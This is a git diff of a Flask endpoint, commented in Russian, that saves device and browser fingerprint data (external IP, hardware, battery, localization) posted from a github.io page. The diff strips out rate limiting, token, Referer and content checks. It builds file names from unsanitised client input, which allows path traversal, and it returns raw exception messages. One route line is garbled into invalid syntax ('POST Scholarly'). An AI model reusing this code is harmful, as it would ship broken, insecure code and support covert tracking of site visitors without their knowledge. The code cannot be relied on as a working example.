@@ -133,75 +133,41 @@ def verify_request_integrity(data, provided_signature):
     expected_signature = generate_request_signature(data)
     return hmac.compare_digest(provided_signature, expected_signature)
 
-@app.route('/collect', methods=['POST'])
-@rate_limit(max_attempts=20, window_seconds=3600)
+@app.route('/collect', methods=['POST Scholarly
 def collect():
     try:
-        # Блокировка автоматических инструментов
-        block_result = block_automated_tools()
-        if block_result:
-            return block_result
-        
-        client_ip = request.headers.get('X-Forwarded-For') or request.remote_addr
-        
-        # КРИТИЧЕСКАЯ проверка - токен должен быть 64 символа HEX
-        page_token = request.headers.get('X-Page-Token', '')
-        if not page_token or len(page_token) != 64 or not all(c in '0123456789abcdef' for c in page_token):
-            logger.error(f"INVALID TOKEN ATTEMPT from {client_ip} - token: {page_token[:20]}...")
-            return jsonify({'status': 'error', 'message': 'Security violation detected'}), 403
-        
-        logger.info(f"Data collection request from {client_ip}")
-        # Сбор данных работает только с сайта (проверка Referer)
-        # Просмотр и удаление файлов требуют пароль
-        
-        # Требуется Referer или Origin от твоего сайта
-        referer = request.headers.get('Referer', '')
-        origin = request.headers.get('Origin', '')
-        allowed = False
-        if referer.startswith('https://gitububkm.github.io'):
-            allowed = True
-        if origin.startswith('https://gitububkm.github.io'):
-            allowed = True
-        if not allowed:
-            return jsonify({'status': 'error', 'message': 'Unauthorized source - required from github.io'}), 403
-        
         data = request.get_json() or {}
-        
-        # СТРОГАЯ проверка: данные должны быть ТОЧНО в формате от фронтенда
-        if 'folder_name' in data or 'file_name' in data:
-            logger.error(f"Attempted to modify immutable fields from {client_ip}")
-            return jsonify({'error': 'Unauthorized data modification attempt'}), 403
-        
-        # Ограничиваем данные, которые могут быть изменены клиентом
-        folder = 'site_logs'  # Фиксированная папка
-        raw_filename = None
         content = data.get('content', '')
         
-        # КРИТИЧЕСКАЯ проверка - content должен содержать МАКСИМУМ данных от браузера
-        required_sections = ['=== Network ===', '=== System Info ===', '=== Browser ===', '=== Hardware ===', '=== Localization ===', '=== Battery ===', '=== Timestamp ===']
-        if not content or not all(section in content for section in required_sections):
-            logger.error(f"SECURITY: Missing sections from {client_ip}")
-            return jsonify({'status': 'error', 'message': 'Invalid data format'}), 400
+        if not content:
+            return jsonify({'status': 'error', 'message': 'No content provided'}), 400
         
-        # Проверка наличия всех обязательных ключей
-        required_keys = ['platform', 'model', 'externalIP', 'fingerprint', 'userAgent', 'language', 'screen']
-        if not all(key in data for key in required_keys):
-            logger.error(f"SECURITY: Missing keys from {client_ip}")
-            return jsonify({'status': 'error', 'message': 'Missing required data'}), 400
+        # Простое имя файла с timestamp
+        timestamp = datetime.now().strftime('%Y%m%d_%H%M%S')
+        platform = data.get('platform', 'unknown').replace(' ', '_')[:20]
+        model = data.get('model', 'unknown').replace(' ', '_')[:20]
+        filename = f"{platform}_{model}_{timestamp}.txt"
         
-        # Проверка минимального размера данных
-        if len(content) < 300:  # Минимум 300 символов
-            logger.error(f"Content too small from {client_ip}")
-            return jsonify({'status': 'error', 'message': 'Content too small'}), 400
+        folder = 'site_logs'
+        folder_path = os.path.join(DATA_DIR, folder)
+        os.makedirs(folder_path, exist_ok=True)
+        file_path = os.path.join(folder_path, filename)
         
-        # Проверка наличия достаточного количества полей
-        if content.count(':') < 20:  # Минимум 20 полей
-            logger.error(f"Insufficient data fields from {client_ip}")
-            return jsonify({'status': 'error', 'message': 'Insufficient data'}), 400
+        with open(file_path, 'w', encoding='utf-8') as f:
+            f.write(content)
         
-        # Ограничение размера содержимого
-        if len(content) > 100000:  # 100KB максимум
-            content = content[:100000] + '\n[File truncated - too large]'
+        return jsonify({'status': 'ok', 'message': 'Data saved'}), 200
+    except Exception as e:
+        return jsonify({'status': 'error', 'message': str(e)}), 500
+
+@app.route('/collect_old', methods=['POST'])
+def collect_old():
+    try:
+        data = request.get_json() or {}
+        content = data.get('content', '')
+        
+        if not content:
+            return jsonify({'status': 'error', 'message': 'No content provided'}), 400
 
         # ——— Fingerprint и системные признаки (для авто-имени) ———
         fp = data.get('fingerprint') or ''
